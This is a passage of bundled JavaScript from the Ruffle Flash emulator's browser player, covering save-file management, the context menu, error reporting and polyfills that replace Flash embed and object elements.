      deleteSave(e) {
        const n = localStorage.getItem(e);
        n && this.confirmReloadSave(e, n, false);
      }
      populateSaves() {
        const e = this.saveManager.querySelector("#local-saves");
        if (e) {
          try {
            if (null === localStorage) return;
          } catch (e) {
            return;
          }
          e.textContent = "", Object.keys(localStorage).forEach(n => {
            const t = n.split("/").pop(), r = localStorage.getItem(n);
            if (t && r && this.isB64SOL(r)) {
              const a = document.createElement("TR"), i = document.createElement("TD");
              i.textContent = t, i.title = n;
              const o = document.createElement("TD"), s = document.createElement("SPAN");
              s.textContent = ve("save-download"), s.className = "save-option", s.addEventListener("click", () => {
                const e = this.base64ToBlob(r, "application/octet-stream");
                this.saveFile(e, t + ".sol");
              }), o.appendChild(s);
              const l = document.createElement("TD"), u = document.createElement("INPUT");
              u.type = "file", u.accept = ".sol", u.className = "replace-save", u.id = "replace-save-" + n;
              const c = document.createElement("LABEL");
              c.htmlFor = "replace-save-" + n, c.textContent = ve("save-replace"), c.className = "save-option", u.addEventListener("change", e => this.replaceSOL(e, n)), l.appendChild(u), l.appendChild(c);
              const d = document.createElement("TD"), f = document.createElement("SPAN");
              f.textContent = ve("save-delete"), f.className = "save-option", f.addEventListener("click", () => this.deleteSave(n)), d.appendChild(f), a.appendChild(i), a.appendChild(o), a.appendChild(l), a.appendChild(d), e.appendChild(a);
            }
          });
        }
      }
      async backupSaves() {
        const e = new (Gn()), n = [];
        Object.keys(localStorage).forEach(t => {
          let r = String(t.split("/").pop());
          const a = localStorage.getItem(t);
          if (a && this.isB64SOL(a)) {
            const t = this.base64ToBlob(a, "application/octet-stream"), i = n.filter(e => e === r).length;
            n.push(r), i > 0 && (r += ` (${i + 1})`), e.file(r + ".sol", t);
          }
        });
        const t = await e.generateAsync({type: "blob"});
        this.saveFile(t, "saves.zip");
      }
      openHardwareAccelerationModal() {
        this.hardwareAccelerationModal.classList.remove("hidden");
      }
      openSaveManager() {
        this.saveManager.classList.remove("hidden");
      }
      openVolumeControls() {
        this.volumeControls.classList.remove("hidden");
      }
      async downloadSwf() {
        try {
          if (this.swfUrl) {
            console.log("Downloading SWF: " + this.swfUrl);
            const e = await fetch(this.swfUrl.href);
            if (!e.ok) return void console.error("SWF download failed");
            const n = await e.blob();
            this.saveFile(n, function (e) {
              const n = e.pathname;
              return n.substring(n.lastIndexOf("/") + 1);
            }(this.swfUrl));
          } else console.error("SWF download failed");
        } catch (e) {
          console.error("SWF download failed");
        }
      }
      virtualKeyboardInput() {
        const e = this.virtualKeyboard, n = e.value;
        for (const e of n) for (const n of ["keydown", "keyup"]) this.dispatchEvent(new KeyboardEvent(n, {key: e, bubbles: true}));
        e.value = "";
      }
      openVirtualKeyboard() {
        navigator.userAgent.toLowerCase().includes("android") ? setTimeout(() => {
          this.virtualKeyboard.focus({preventScroll: true});
        }, 100) : this.virtualKeyboard.focus({preventScroll: true});
      }
      isVirtualKeyboardFocused() {
        return this.shadow.activeElement === this.virtualKeyboard;
      }
      contextMenuItems() {
        const e = String.fromCharCode(10003), n = [], t = () => {
          n.length > 0 && null !== n[n.length - 1] && n.push(null);
        };
        this.instance && this.isPlaying && (this.instance.prepare_context_menu().forEach((r, a) => {
          r.separatorBefore && t(), n.push({text: r.caption + (r.checked ? ` (${e})` : ""), onClick: () => {
            var e;
            return null === (e = this.instance) || undefined === e ? undefined : e.run_context_menu_callback(a);
          }, enabled: r.enabled});
        }), t()), this.fullscreenEnabled && (this.isFullscreen ? n.push({text: ve("context-menu-exit-fullscreen"), onClick: () => {
          var e;
          return null === (e = this.instance) || undefined === e ? undefined : e.set_fullscreen(false);
        }}) : n.push({text: ve("context-menu-enter-fullscreen"), onClick: () => {
          var e;
          return null === (e = this.instance) || undefined === e ? undefined : e.set_fullscreen(true);
        }})), n.push({text: ve("context-menu-volume-controls"), onClick: () => {
          this.openVolumeControls();
        }}), this.instance && this.swfUrl && this.loadedConfig && true === this.loadedConfig.showSwfDownload && (t(), n.push({text: ve("context-menu-download-swf"), onClick: this.downloadSwf.bind(this)})), navigator.clipboard && window.isSecureContext && n.push({text: ve("context-menu-copy-debug-info"), onClick: () => navigator.clipboard.writeText(this.getPanicData())}), this.populateSaves();
        const r = this.saveManager.querySelector("#local-saves");
        return r && "" !== r.textContent && n.push({text: ve("context-menu-open-save-manager"), onClick: this.openSaveManager.bind(this)}), t(), n.push({text: ve("context-menu-about-ruffle", {flavor: d ? "extension" : "", version: Vn.versionName}), onClick() {
          window.open(Yn, "_blank");
        }}), this.isTouch && (t(), n.push({text: ve("context-menu-hide"), onClick: () => this.contextMenuForceDisabled = true})), n;
      }
      pointerDown(e) {
        this.pointerDownPosition = new rt(e.pageX, e.pageY), this.pointerMoveMaxDistance = 0, this.startLongPressTimer();
      }
      clearLongPressTimer() {
        this.longPressTimer && (clearTimeout(this.longPressTimer), this.longPressTimer = null);
      }
      startLongPressTimer() {
        this.clearLongPressTimer(), this.longPressTimer = setTimeout(() => this.clearLongPressTimer(), 800);
      }
      checkLongPressMovement(e) {
        if (null !== this.pointerDownPosition) {
          const n = new rt(e.pageX, e.pageY), t = this.pointerDownPosition.distanceTo(n);
          t > this.pointerMoveMaxDistance && (this.pointerMoveMaxDistance = t);
        }
      }
      checkLongPress(e) {
        this.longPressTimer ? this.clearLongPressTimer() : !this.contextMenuSupported && "mouse" !== e.pointerType && this.pointerMoveMaxDistance < 15 && this.showContextMenu(e);
      }
      showContextMenu(e) {
        var n, t, r;
        const a = Array.from(this.shadow.querySelectorAll(".modal")).some(e => !e.classList.contains("hidden"));
        if (this.panicked || a) return;
        if (e.preventDefault(), "contextmenu" === e.type ? (this.contextMenuSupported = true, document.documentElement.addEventListener("click", this.hideContextMenu.bind(this), {once: true})) : (document.documentElement.addEventListener("pointerup", this.hideContextMenu.bind(this), {once: true}), e.stopPropagation()), [false, Mn.Off].includes(null !== (t = null === (n = this.loadedConfig) || undefined === n ? undefined : n.contextMenu) && undefined !== t ? t : Mn.On) || this.isTouch && (null === (r = this.loadedConfig) || undefined === r ? undefined : r.contextMenu) === Mn.RightClickOnly || this.contextMenuForceDisabled) return;
        for (; this.contextMenuElement.firstChild;) this.contextMenuElement.removeChild(this.contextMenuElement.firstChild);
        for (const e of this.contextMenuItems()) if (null === e) {
          const e = document.createElement("li");
          e.className = "menu-separator";
          const n = document.createElement("hr");
          e.appendChild(n), this.contextMenuElement.appendChild(e);
        } else {
          const {text: n, onClick: t, enabled: r} = e, a = document.createElement("li");
          a.className = "menu-item", a.textContent = n, this.contextMenuElement.appendChild(a), false !== r ? a.addEventListener(this.contextMenuSupported ? "click" : "pointerup", t) : a.classList.add("disabled");
        }
        this.contextMenuElement.style.left = "0", this.contextMenuElement.style.top = "0", this.contextMenuOverlay.classList.remove("hidden");
        const i = this.getBoundingClientRect(), o = e.clientX - i.x, s = e.clientY - i.y, l = i.width - this.contextMenuElement.clientWidth - 1, u = i.height - this.contextMenuElement.clientHeight - 1;
        this.contextMenuElement.style.left = Math.floor(Math.min(o, l)) + "px", this.contextMenuElement.style.top = Math.floor(Math.min(s, u)) + "px";
      }
      hideContextMenu() {
        var e;
        null === (e = this.instance) || undefined === e || e.clear_custom_menu_items(), this.contextMenuOverlay.classList.add("hidden");
      }
      pause() {
        this.instance && (this.instance.pause(), this.playButton.style.display = "block");
      }
      audioState() {
        if (this.instance) {
          const e = this.instance.audio_context();
          return e && e.state || "running";
        }
        return "suspended";
      }
      unmuteOverlayClicked() {
        if (this.instance) {
          if ("running" !== this.audioState()) {
            const e = this.instance.audio_context();
            e && e.resume();
          }
          this.unmuteOverlay.style.display = "none";
        }
      }
      unmuteAudioContext() {
        Qn || (navigator.maxTouchPoints < 1 ? Qn = true : this.container.addEventListener("click", () => {
          var e;
          if (Qn) return;
          const n = null === (e = this.instance) || undefined === e ? undefined : e.audio_context();
          if (!n) return;
          const t = new Audio;
          t.src = (() => {
            const e = new ArrayBuffer(10), t = new DataView(e), r = n.sampleRate;
            return t.setUint32(0, r, true), t.setUint32(4, r, true), t.setUint16(8, 1, true), `data:audio/wav;base64,UklGRisAAABXQVZFZm10IBAAAAABAAEA${window.btoa(String.fromCharCode(...new Uint8Array(e))).slice(0, 13)}AgAZGF0YQcAAACAgICAgICAAAA=`;
          })(), t.load(), t.play().then(() => {
            Qn = true;
          }).catch(e => {
            console.warn(`Failed to play dummy sound: ${e}`);
          });
        }, {once: true}));
      }
      copyElement(e) {
        if (e) {
          for (const n of e.attributes) if (n.specified) {
            if ("title" === n.name && "Adobe Flash Player" === n.value) continue;
            try {
              this.setAttribute(n.name, n.value);
            } catch (e) {
              console.warn(`Unable to set attribute ${n.name} on Ruffle instance`);
            }
          }
          for (const n of Array.from(e.children)) this.appendChild(n);
        }
      }
      static htmlDimensionToCssDimension(e) {
        if (e) {
          const n = e.match(Xn);
          if (n) {
            let e = n[1];
            return n[3] || (e += "px"), e;
          }
        }
        return null;
      }
      onCallbackAvailable(e) {
        const n = this.instance;
        this[e] = (...t) => null == n ? undefined : n.call_exposed_callback(e, t);
      }
      set traceObserver (e) {
        var n;
        null === (n = this.instance) || undefined === n || n.set_trace_observer(e);
      }
      getPanicData() {
        let e = "\n# Player Info\n";
        if (e += `Allows script access: ${!!this.loadedConfig && this.loadedConfig.allowScriptAccess}\n`, e += `${this.rendererDebugInfo}\n`, e += this.debugPlayerInfo(), e += "\n# Page Info\n", e += `Page URL: ${document.location.href}\n`, this.swfUrl && (e += `SWF URL: ${this.swfUrl}\n`), e += "\n# Browser Info\n", e += `User Agent: ${window.navigator.userAgent}\n`, e += `Platform: ${window.navigator.platform}\n`, e += `Has touch support: ${window.navigator.maxTouchPoints > 0}\n`, e += "\n# Ruffle Info\n", e += `Version: ${Vn.versionNumber}\n`, e += `Name: ${Vn.versionName}\n`, e += `Channel: ${Vn.versionChannel}\n`, e += `Built: ${Vn.buildDate}\n`, e += `Commit: ${Vn.commitHash}\n`, e += `Is extension: ${d}\n`, e += "\n# Metadata\n", this.metadata) for (const [n, t] of Object.entries(this.metadata)) e += `${n}: ${t}\n`;
        return e;
      }
      createErrorFooter(e) {
        const n = document.createElement("ul");
        for (const t of e) {
          const e = document.createElement("li"), r = document.createElement("a");
          r.href = t.url, r.textContent = t.label, "#" === t.url ? r.id = "panic-view-details" : r.target = "_top", e.appendChild(r), n.appendChild(e);
        }
        return n;
      }
      panic(e) {
        var n;
        if (this.panicked) return;
        if (this.panicked = true, this.hideSplashScreen(), e instanceof Error && ("AbortError" === e.name || e.message.includes("AbortError"))) return;
        const t = null !== (n = null == e ? undefined : e.ruffleIndexError) && undefined !== n ? n : et.Unknown, r = Object.assign([], {stackIndex: -1, avmStackIndex: -1});
        if (r.push("# Error Info\n"), e instanceof Error) {
          if (r.push(`Error name: ${e.name}\n`), r.push(`Error message: ${e.message}\n`), e.stack) {
            const n = r.push(`Error stack:\n\`\`\`\n${e.stack}\n\`\`\`\n`) - 1;
            if (e.avmStack) {
              const n = r.push(`AVM2 stack:\n\`\`\`\n    ${e.avmStack.trim().replace(/\t/g, "    ")}\n\`\`\`\n`) - 1;
              r.avmStackIndex = n;
            }
            r.stackIndex = n;
          }
        } else r.push(`Error: ${e}\n`);
        r.push(this.getPanicData());
        const a = r.join(""), i = new Date(Vn.buildDate), o = new Date;
        o.setMonth(o.getMonth() - 6);
        const s = o > i;
        let l, u, c;
        if (s) l = new at(Yn + "#downloads", ve("update-ruffle")); else {
          let e;
          e = document.location.protocol.includes("extension") ? this.swfUrl.href : document.location.href, e = e.split(/[?#]/, 1)[0];
          let n = `https://github.com/ruffle-rs/ruffle/issues/new?title=${encodeURIComponent(`Error on ${e}`)}&template=error_report.md&labels=error-report&body=`, t = encodeURIComponent(a);
          r.stackIndex > -1 && String(n + t).length > 8195 && (r[r.stackIndex] = null, r.avmStackIndex > -1 && (r[r.avmStackIndex] = null), t = encodeURIComponent(r.join(""))), n += t, l = new at(n, ve("report-bug"));
        }
        switch (t) {
          case et.FileProtocol:
            u = ge("error-file-protocol"), c = this.createErrorFooter([new at(Yn + "/demo", ve("ruffle-demo")), new at(Yn + "#downloads", ve("ruffle-desktop"))]);
            break;
          case et.JavascriptConfiguration:
            u = ge("error-javascript-config"), c = this.createErrorFooter([new at("https://github.com/ruffle-rs/ruffle/wiki/Using-Ruffle#javascript-api", ve("ruffle-wiki")), new at]);
            break;
          case et.WasmNotFound:
            u = ge("error-wasm-not-found"), c = this.createErrorFooter([new at("https://github.com/ruffle-rs/ruffle/wiki/Using-Ruffle#configuration-options", ve("ruffle-wiki")), new at]);
            break;
          case et.WasmMimeType:
            u = ge("error-wasm-mime-type"), c = this.createErrorFooter([new at("https://github.com/ruffle-rs/ruffle/wiki/Using-Ruffle#configure-webassembly-mime-type", ve("ruffle-wiki")), new at]);
            break;
          case et.SwfFetchError:
            u = ge("error-swf-fetch"), c = this.createErrorFooter([new at]);
            break;
          case et.SwfCors:
            u = ge("error-swf-cors"), c = this.createErrorFooter([new at("https://github.com/ruffle-rs/ruffle/wiki/Using-Ruffle#configure-cors-header", ve("ruffle-wiki")), new at]);
            break;
          case et.WasmCors:
            u = ge("error-wasm-cors"), c = this.createErrorFooter([new at("https://github.com/ruffle-rs/ruffle/wiki/Using-Ruffle#configure-cors-header", ve("ruffle-wiki")), new at]);
            break;
          case et.InvalidWasm:
            u = ge("error-wasm-invalid"), c = this.createErrorFooter([new at("https://github.com/ruffle-rs/ruffle/wiki/Using-Ruffle#addressing-a-compileerror", ve("ruffle-wiki")), new at]);
            break;
          case et.WasmDownload:
            u = ge("error-wasm-download"), c = this.createErrorFooter([new at]);
            break;
          case et.WasmDisabledMicrosoftEdge:
            u = ge("error-wasm-disabled-on-edge"), c = this.createErrorFooter([new at("https://github.com/ruffle-rs/ruffle/wiki/Frequently-Asked-Questions-For-Users#edge-webassembly-error", ve("more-info")), new at]);
            break;
          case et.JavascriptConflict:
            u = ge("error-javascript-conflict"), s && u.appendChild(ge("error-javascript-conflict-outdated", {buildDate: Vn.buildDate})), c = this.createErrorFooter([l, new at]);
            break;
          case et.CSPConflict:
            u = ge("error-csp-conflict"), c = this.createErrorFooter([new at("https://github.com/ruffle-rs/ruffle/wiki/Using-Ruffle#configure-wasm-csp", ve("ruffle-wiki")), new at]);
            break;
          default:
            u = ge("error-unknown", {buildDate: Vn.buildDate, outdated: String(s)}), c = this.createErrorFooter([l, new at]);
        }
        const d = document.createElement("div");
        d.id = "panic";
        const f = document.createElement("div");
        f.id = "panic-title", f.textContent = ve("panic-title"), d.appendChild(f);
        const m = document.createElement("div");
        m.id = "panic-body", m.appendChild(u), d.appendChild(m);
        const h = document.createElement("div");
        h.id = "panic-footer", h.appendChild(c), d.appendChild(h), this.container.textContent = "", this.container.appendChild(d);
        const p = this.container.querySelector("#panic-view-details");
        p && (p.onclick = () => {
          const e = this.container.querySelector("#panic-body");
          e.classList.add("details");
          const n = document.createElement("textarea");
          return n.readOnly = true, n.value = a, e.replaceChildren(n), false;
        }), this.destroy();
      }
      displayRootMovieDownloadFailedMessage() {
        var e, n, t;
        const r = null === (e = this.loadedConfig) || undefined === e ? undefined : e.openInNewTab;
        if (r && window.location.origin !== this.swfUrl.origin) {
          const e = new URL(this.swfUrl);
          if (null === (n = this.loadedConfig) || undefined === n ? undefined : n.parameters) {
            const n = tt(null === (t = this.loadedConfig) || undefined === t ? undefined : t.parameters);
            Object.entries(n).forEach(([n, t]) => {
              e.searchParams.set(n, t);
            });
          }
          this.hideSplashScreen();
          const a = document.createElement("div");
          a.id = "message-overlay";
          const i = document.createElement("div");
          i.className = "message", i.appendChild(ge("message-cant-embed"));
          const o = document.createElement("div"), s = document.createElement("a");
          s.innerText = ve("open-in-new-tab"), s.onclick = () => r(e), o.appendChild(s), i.appendChild(o), a.appendChild(i), this.container.prepend(a);
        } else {
          const e = new Error("Failed to fetch: " + this.swfUrl);
          this.swfUrl.protocol.includes("http") ? window.location.origin === this.swfUrl.origin || window.location.protocol.includes("extension") ? e.ruffleIndexError = et.SwfFetchError : e.ruffleIndexError = et.SwfCors : e.ruffleIndexError = et.FileProtocol, this.panic(e);
        }
      }
      displayMessage(e) {
        const n = document.createElement("div");
        n.id = "message-overlay";
        const t = document.createElement("div");
        t.className = "message";
        const r = document.createElement("p");
        r.textContent = e, t.appendChild(r);
        const a = document.createElement("div"), i = document.createElement("button");
        i.id = "continue-btn", i.textContent = ve("continue"), a.appendChild(i), t.appendChild(a), n.appendChild(t), this.container.prepend(n), this.container.querySelector("#continue-btn").onclick = () => {
          n.parentNode.removeChild(n);
        };
      }
      displayUnsupportedVideo(e) {
        const n = this.videoModal.querySelector("#video-holder");
        if (n) {
          const t = document.createElement("video");
          t.addEventListener("contextmenu", e => e.stopPropagation()), t.src = e, t.autoplay = true, t.controls = true, n.textContent = "", n.appendChild(t), this.videoModal.classList.remove("hidden");
        }
      }
      debugPlayerInfo() {
        return "";
      }
      hideSplashScreen() {
        this.splashScreen.classList.add("hidden"), this.container.classList.remove("hidden");
      }
      showSplashScreen() {
        this.splashScreen.classList.remove("hidden"), this.container.classList.add("hidden");
      }
      setMetadata(e) {
        this._metadata = e, this._readyState = nt.Loaded, this.hideSplashScreen(), this.dispatchEvent(new CustomEvent(it.LOADED_METADATA)), this.dispatchEvent(new CustomEvent(it.LOADED_DATA));
      }
    }
    function ot(e, n) {
      switch (null == e ? undefined : e.toLowerCase()) {
        case "always":
          return true;
        case "never":
          return false;
        case "samedomain":
          try {
            return new URL(window.location.href).origin === new URL(n, window.location.href).origin;
          } catch (e) {
            return false;
          }
        default:
          return null;
      }
    }
    function st(e, n) {
      const t = {url: e}, r = n("allowNetworking");
      null !== r && (t.allowNetworking = r);
      const a = ot(n("allowScriptAccess"), e);
      null !== a && (t.allowScriptAccess = a);
      const i = n("bgcolor");
      null !== i && (t.backgroundColor = i);
      const o = n("base");
      null !== o && (t.base = o);
      const s = function (e) {
        switch (null == e ? undefined : e.toLowerCase()) {
          case "true":
            return true;
          case "false":
            return false;
          default:
            return null;
        }
      }(n("menu"));
      null !== s && (t.menu = s);
      const l = n("flashvars");
      null !== l && (t.parameters = l);
      const u = n("quality");
      null !== u && (t.quality = u);
      const c = n("salign");
      null !== c && (t.salign = c);
      const d = n("scale");
      null !== d && (t.scale = d);
      const f = n("wmode");
      return null !== f && (t.wmode = f), t;
    }
    function lt(e) {
      if (e) {
        let n = "", t = "";
        try {
          const r = new URL(e, Yn);
          n = r.pathname, t = r.hostname;
        } catch (e) {}
        if (n.startsWith("/v/") && /^(?:(?:www\.|m\.)?youtube(?:-nocookie)?\.com)|(?:youtu\.be)$/i.test(t)) return true;
      }
      return false;
    }
    function ut(e, n) {
      var t, r;
      const a = e.getAttribute(n), i = null !== (r = null === (t = window.RufflePlayer) || undefined === t ? undefined : t.config) && undefined !== r ? r : {};
      if (a) try {
        const t = new URL(a);
        "http:" !== t.protocol || "https:" !== window.location.protocol || "upgradeToHttps" in i && false === i.upgradeToHttps || (t.protocol = "https:", e.setAttribute(n, t.toString()));
      } catch (e) {}
    }
    function ct(e) {
      let n = e.parentElement;
      for (; null !== n;) {
        switch (n.tagName) {
          case "AUDIO":
          case "VIDEO":
            return true;
        }
        n = n.parentElement;
      }
      return false;
    }
    it.LOADED_METADATA = "loadedmetadata", it.LOADED_DATA = "loadeddata", function (e) {
      e[e.HaveNothing = 0] = "HaveNothing", e[e.Loading = 1] = "Loading", e[e.Loaded = 2] = "Loaded";
    }(nt || (nt = {}));
    class dt {
      constructor(e, n) {
        this.isMuted = e, this.volume = n;
      }
      get_volume() {
        return this.isMuted ? 0 : this.volume / 100;
      }
    }
    class ft extends it {
      constructor() {
        super();
      }
      connectedCallback() {
        super.connectedCallback();
        const e = this.attributes.getNamedItem("src");
        if (e) {
          const n = e => {
            var n, t;
            return null !== (t = null === (n = this.attributes.getNamedItem(e)) || undefined === n ? undefined : n.value) && undefined !== t ? t : null;
          }, t = st(e.value, n);
          this.load(t, true);
        }
      }
      get src() {
        var e;
        return null === (e = this.attributes.getNamedItem("src")) || undefined === e ? undefined : e.value;
      }
      set src (e) {
        if (e) {
          const n = document.createAttribute("src");
          n.value = e, this.attributes.setNamedItem(n);
        } else this.attributes.removeNamedItem("src");
      }
      static get observedAttributes() {
        return ["src", "width", "height"];
      }
      attributeChangedCallback(e, n, t) {
        if (super.attributeChangedCallback(e, n, t), this.isConnected && "src" === e) {
          const e = this.attributes.getNamedItem("src");
          if (e) {
            const n = e => {
              var n, t;
              return null !== (t = null === (n = this.attributes.getNamedItem(e)) || undefined === n ? undefined : n.value) && undefined !== t ? t : null;
            }, t = st(e.value, n);
            this.load(t, true);
          }
        }
      }
      static isInterdictable(e) {
        const n = e.getAttribute("src"), t = e.getAttribute("type");
        return !!n && !ct(e) && (lt(n) ? (ut(e, "src"), false) : Jn(n, t));
      }
      static fromNativeEmbedElement(e) {
        const n = In("ruffle-embed", ft), t = document.createElement(n);
        return t.copyElement(e), t;
      }
    }
    function mt(e) {
      var n, t;
      const r = {};
      for (const a of e.children) if (a instanceof HTMLParamElement) {
        const e = null === (n = a.attributes.getNamedItem("name")) || undefined === n ? undefined : n.value, i = null === (t = a.attributes.getNamedItem("value")) || undefined === t ? undefined : t.value;
        e && i && (r[e] = i);
      }
      return r;
    }
    class ht extends it {
      constructor() {
        super(), this.params = {};
      }
      connectedCallback() {
        var e;
        super.connectedCallback(), this.params = mt(this);
        let n = null;
        if (this.attributes.getNamedItem("data") ? n = null === (e = this.attributes.getNamedItem("data")) || undefined === e ? undefined : e.value : this.params.movie && (n = this.params.movie), n) {
          const e = ["allowNetworking", "base", "bgcolor", "flashvars"], t = st(n, n => function (e, n, t) {
            n = n.toLowerCase();
            for (const [t, r] of Object.entries(e)) if (t.toLowerCase() === n) return r;
            return t;
          }(this.params, n, e.includes(n) ? this.getAttribute(n) : null));
          this.load(t, true);
        }
      }
      debugPlayerInfo() {
        var e;
        let n = "Player type: Object\n", t = null;
        return this.attributes.getNamedItem("data") ? t = null === (e = this.attributes.getNamedItem("data")) || undefined === e ? undefined : e.value : this.params.movie && (t = this.params.movie), n += `SWF URL: ${t}\n`, Object.keys(this.params).forEach(e => {
          n += `Param ${e}: ${this.params[e]}\n`;
        }), Object.keys(this.attributes).forEach(e => {
          var t;
          n += `Attribute ${e}: ${null === (t = this.attributes.getNamedItem(e)) || undefined === t ? undefined : t.value}\n`;
        }), n;
      }
      get data() {
        return this.getAttribute("data");
      }
      set data (e) {
        if (e) {
          const n = document.createAttribute("data");
          n.value = e, this.attributes.setNamedItem(n);
        } else this.attributes.removeNamedItem("data");
      }
      static isInterdictable(e) {
        var n, t, r, a;
        if (ct(e)) return false;
        if (e.getElementsByTagName("ruffle-object").length > 0 || e.getElementsByTagName("ruffle-embed").length > 0) return false;
        const i = null === (n = e.attributes.getNamedItem("data")) || undefined === n ? undefined : n.value.toLowerCase(), o = null !== (r = null === (t = e.attributes.getNamedItem("type")) || undefined === t ? undefined : t.value) && undefined !== r ? r : null, s = mt(e);
        let l;
        if (i) {
          if (lt(i)) return ut(e, "data"), false;
          l = i;
        } else {
          if (!s || !s.movie) return false;
          if (lt(s.movie)) {
            const n = e.querySelector("param[name='movie']");
            if (n) {
              ut(n, "value");
              const t = n.getAttribute("value");
              t && e.setAttribute("data", t);
            }
            return false;
          }
          l = s.movie;
        }
        const u = null === (a = e.attributes.getNamedItem("classid")) || undefined === a ? undefined : a.value.toLowerCase();
        return u === "clsid:D27CDB6E-AE6D-11cf-96B8-444553540000".toLowerCase() ? !Array.from(e.getElementsByTagName("object")).some(ht.isInterdictable) && !Array.from(e.getElementsByTagName("embed")).some(ft.isInterdictable) : !u && Jn(l, o);
      }
      static fromNativeObjectElement(e) {
        const n = In("ruffle-object", ht), t = document.createElement(n);
        for (const n of Array.from(e.getElementsByTagName("embed"))) ft.isInterdictable(n) && n.remove();
        for (const n of Array.from(e.getElementsByTagName("object"))) ht.isInterdictable(n) && n.remove();
        return t.copyElement(e), t;
      }
    }
    class pt {
      constructor(e) {
        if (this.__mimeTypes = [], this.__namedMimeTypes = {}, e) for (let n = 0; n < e.length; n++) this.install(e[n]);
      }
      install(e) {
        const n = this.__mimeTypes.length;
        this.__mimeTypes.push(e), this.__namedMimeTypes[e.type] = e, this[e.type] = e, this[n] = e;
      }
      item(e) {
        return this.__mimeTypes[e >>> 0];
      }
      namedItem(e) {
        return this.__namedMimeTypes[e];
      }
      get length() {
        return this.__mimeTypes.length;
      }
      [Symbol.iterator]() {
        return this.__mimeTypes[Symbol.iterator]();
      }
    }
    class vt {
      constructor(e) {
        this.__plugins = [], this.__namedPlugins = {};
        for (let n = 0; n < e.length; n++) this.install(e[n]);
      }
      install(e) {
        const n = this.__plugins.length;
        this.__plugins.push(e), this.__namedPlugins[e.name] = e, this[e.name] = e, this[n] = e;
      }
      item(e) {
        return this.__plugins[e >>> 0];
      }
      namedItem(e) {
        return this.__namedPlugins[e];
      }
      refresh() {}
      [Symbol.iterator]() {
        return this.__plugins[Symbol.iterator]();
      }
      get length() {
        return this.__plugins.length;
      }
    }
    const gt = new class extends pt {
      constructor(e, n, t) {
        super(), this.name = e, this.description = n, this.filename = t;
      }
    }("Shockwave Flash", "Shockwave Flash 32.0 r0", "ruffle.js");
    var bt, wt;
    gt.install({type: Un, description: "Shockwave Flash", suffixes: "spl", enabledPlugin: gt}), gt.install({type: Nn, description: "Shockwave Flash", suffixes: "swf", enabledPlugin: gt}), gt.install({type: Zn, description: "Shockwave Flash", suffixes: "swf", enabledPlugin: gt}), gt.install({type: Hn, description: "Shockwave Flash", suffixes: "swf", enabledPlugin: gt});
    const kt = null !== (wt = null === (bt = window.RufflePlayer) || undefined === bt ? undefined : bt.config) && undefined !== wt ? wt : {}, yt = f(kt) + "ruffle.js";
    let xt, Rt, _t, zt;
    function St() {
      var e, n;
      return (!("favorFlash" in kt) || false !== kt.favorFlash) && "ruffle.js" !== (null !== (n = null === (e = navigator.plugins.namedItem("Shockwave Flash")) || undefined === e ? undefined : e.filename) && undefined !== n ? n : "ruffle.js");
    }
    function jt() {
      try {
        xt = null != xt ? xt : document.getElementsByTagName("object"), Rt = null != Rt ? Rt : document.getElementsByTagName("embed");
        for (const e of Array.from(xt)) if (ht.isInterdictable(e)) {
          const n = ht.fromNativeObjectElement(e);
          e.replaceWith(n);
        }
        for (const e of Array.from(Rt)) if (ft.isInterdictable(e)) {
          const n = ft.fromNativeEmbedElement(e);
          e.replaceWith(n);
        }
      } catch (e) {
        console.error(`Serious error encountered when polyfilling native Flash elements: ${e}`);
      }
    }
    function Et() {
      _t = null != _t ? _t : document.getElementsByTagName("iframe"), zt = null != zt ? zt : document.getElementsByTagName("frame"), [_t, zt].forEach(e => {
        for (const n of e) {
          if (undefined !== n.dataset.rufflePolyfilled) continue;
          n.dataset.rufflePolyfilled = "";
          const e = n.contentWindow, t = `Couldn't load Ruffle into ${n.tagName}[${n.src}]: `;
          try {
            "complete" === e.document.readyState && Ct(e, t);
          } catch (e) {
            d || console.warn(t + e);
          }
          n.addEventListener("load", () => {
            Ct(e, t);
          }, false);
        }
      });
    }
    async function Ct(e, n) {
      var t;
      let r;
      await new Promise(e => {
        window.setTimeout(() => {
          e();
        }, 100);
      });
      try {
        if (r = e.document, !r) return;
      } catch (e) {
        return void (d || console.warn(n + e));
      }
      if (d || undefined === r.documentElement.dataset.ruffleOptout) if (d) e.RufflePlayer || (e.RufflePlayer = {}), e.RufflePlayer.config = Object.assign(Object.assign({}, kt), null !== (t = e.RufflePlayer.config) && undefined !== t ? t : {}); else if (!e.RufflePlayer) {
        const n = r.createElement("script");
        n.setAttribute("src", yt), n.onload = () => {
          e.RufflePlayer = {}, e.RufflePlayer.config = kt;
        }, r.head.appendChild(n);
      }
    }
    const Ft = {version: Vn.versionNumber + "+" + Vn.buildDate.substring(0, 10), polyfill() {
      !function It() {
        St() || (jt(), Et(), new MutationObserver(function (e) {
          e.some(e => Array.from(e.addedNodes).some(e => ["EMBED", "OBJECT"].includes(e.nodeName) || e instanceof Element && null !== e.querySelector("embed, object"))) && (jt(), Et());
        }).observe(document, {childList: true, subtree: true}));
      }();
    }, pluginPolyfill() {
      !function At() {
        St() || function (e) {
          "install" in navigator.plugins && navigator.plugins.install || Object.defineProperty(navigator, "plugins", {value: new vt(navigator.plugins), writable: false}), navigator.plugins.install(e), !(e.length > 0) || "install" in navigator.mimeTypes && navigator.mimeTypes.install || Object.defineProperty(navigator, "mimeTypes", {value: new pt(navigator.mimeTypes), writable: false});
          const n = navigator.mimeTypes;
          for (let t = 0; t < e.length; t += 1) n.install(e[t]);
        }(gt);
      }();
    }, createPlayer() {
      const e = In("ruffle-player", it);
      return document.createElement(e);
    }};
    class Ot {
      constructor(e) {
        var n;
        this.sources = (null == e ? undefined : e.sources) || {}, this.config = (null == e ? undefined : e.config) || {}, this.invoked = (null == e ? undefined : e.invoked) || false, this.newestName = (null == e ? undefined : e.newestName) || null, null === (n = null == e ? undefined : e.superseded) || undefined === n || n.call(e), "loading" === document.readyState ? document.addEventListener("readystatechange", this.init.bind(this)) : window.setTimeout(this.init.bind(this), 0);
      }
      get version() {
        return "0.1.0";
      }
      registerSource(e) {
        this.sources[e] = Ft;
      }
      newestSourceName() {
        let n = null, t = e.fromSemver("0.0.0");
        for (const r in this.sources) if (Object.prototype.hasOwnProperty.call(this.sources, r)) {
          const a = e.fromSemver(this.sources[r].version);
          a.hasPrecedenceOver(t) && (n = r, t = a);
        }
        return n;
      }
      init() {
        if (!this.invoked) {
          if (this.invoked = true, this.newestName = this.newestSourceName(), null === this.newestName) throw new Error("No registered Ruffle source!");
          false !== (!("polyfills" in this.config) || this.config.polyfills) && this.sources[this.newestName].polyfill();
        }
      }
      newest() {
        const e = this.newestSourceName();
